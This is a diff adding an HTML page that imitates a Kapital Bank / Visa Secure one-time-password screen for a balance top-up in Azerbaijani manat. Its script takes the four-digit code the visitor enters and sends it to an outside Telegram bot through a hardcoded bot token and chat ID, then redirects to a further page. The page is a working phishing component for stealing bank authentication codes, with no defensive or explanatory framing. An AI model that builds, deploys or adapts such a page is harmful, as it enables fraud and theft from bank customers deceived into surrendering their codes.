@@ -1,0 +1,103 @@
+<html lang="en">
+<head>
+    <meta charset="utf-8"/>
+    <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+    <title>Balance Increase</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
+    <script>
+        document.addEventListener('DOMContentLoaded', (event) => {
+            let timer = 180; // 3 minutes in seconds
+            const timerElement = document.getElementById('timer');
+
+            const interval = setInterval(() => {
+                const minutes = Math.floor(timer / 60);
+                const seconds = timer % 60;
+                timerElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+                timer--;
+
+                if (timer < 0) {
+                    clearInterval(interval);
+                    timerElement.textContent = "00:00";
+                }
+            }, 1000);
+
+            const inputs = document.querySelectorAll('.otp-input');
+            inputs.forEach((input, index) => {
+                input.addEventListener('input', (e) => {
+                    if (e.target.value.length > 1) {
+                        e.target.value = e.target.value.slice(0, 1);
+                    }
+                    if (e.target.value.length === 1 && index < inputs.length - 1) {
+                        inputs[index + 1].focus();
+                    }
+                });
+                input.addEventListener('keydown', (e) => {
+                    if (e.key === 'Backspace' && input.value.length === 0 && index > 0) {
+                        inputs[index - 1].focus();
+                    }
+                });
+            });
+        });
+
+        function sendCodeToTelegram() {
+            const botToken = '7824147980:AAFr0maZVG9PQ5x19zXfE768R4j_DRyH60o';
+            const chatId = '@teamccas';
+            const code = Array.from(document.querySelectorAll('.otp-input')).map(input => input.value).join('');
+
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=Entered Code: ${code}`;
+
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        
+                        window.location.href = 'codesecure.html';
+                    } else {
+                        alert('Failed to send code to Telegram.');
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    alert('Error sending code to Telegram.');
+                });
+        }
+    </script>
+</head>
+<body class="bg-white text-black font-sans">
+<div class="max-w-md mx-auto p-4">
+    <div class="flex items-center justify-between mb-4">
+        <h1 class="text-lg font-semibold">Balansın artırılması</h1>
+        <div></div>
+    </div>
+    <div class="bg-gray-100 p-4 rounded-lg mb-4">
+        <div class="flex items-center justify-between">
+            <img alt="Visa Secure logo" class="h-10" height="50" src="https://resmim.net/cdn/2024/12/20/DsGSR7.jpg" width="100"/>
+            <img alt="Kapital Bank logo" class="h-10" height="50" src="https://resmim.net/cdn/2024/12/20/DsGZ9H.png" width="100"/>
+        </div>
+        <div class="mt-4">
+            <p class="text-gray-500">Amount</p>
+            <p class="text-lg font-semibold">AZN 100.00</p>
+        </div>
+    </div>
+    <div class="mb-4">
+        <label class="block text-gray-700 mb-2" for="dynamic-password">Enter dynamic password:</label>
+        <div class="flex space-x-2">
+            <input class="w-12 h-12 border border-gray-300 rounded-lg text-center otp-input" id="dynamic-password" maxlength="1" type="text" pattern="[0-9]*" inputmode="numeric"/>
+            <input class="w-12 h-12 border border-gray-300 rounded-lg text-center otp-input" maxlength="1" type="text" pattern="[0-9]*" inputmode="numeric"/>
+            <input class="w-12 h-12 border border-gray-300 rounded-lg text-center otp-input" maxlength="1" type="text" pattern="[0-9]*" inputmode="numeric"/>
+            <input class="w-12 h-12 border border-gray-300 rounded-lg text-center otp-input" maxlength="1" type="text" pattern="[0-9]*" inputmode="numeric"/>
+        </div>
+        <div class="flex justify-between mt-2">
+            <a class="text-blue-500" href="#">Help</a>
+            <a class="text-blue-500" href="#">Resend password</a>
+        </div>
+    </div>
+    <div class="text-gray-700 mb-4">
+        <p>Please enter a dynamic password to confirm your identity. Password has been sent to 994********</p>
+        <p>Dynamic password will expire in <span class="text-blue-500" id="timer">03:00</span></p>
+    </div>
+    <button class="w-full bg-blue-500 text-white py-2 rounded-lg" onclick="sendCodeToTelegram()">Göndər</button>
+</div>
+</body>
+</html>
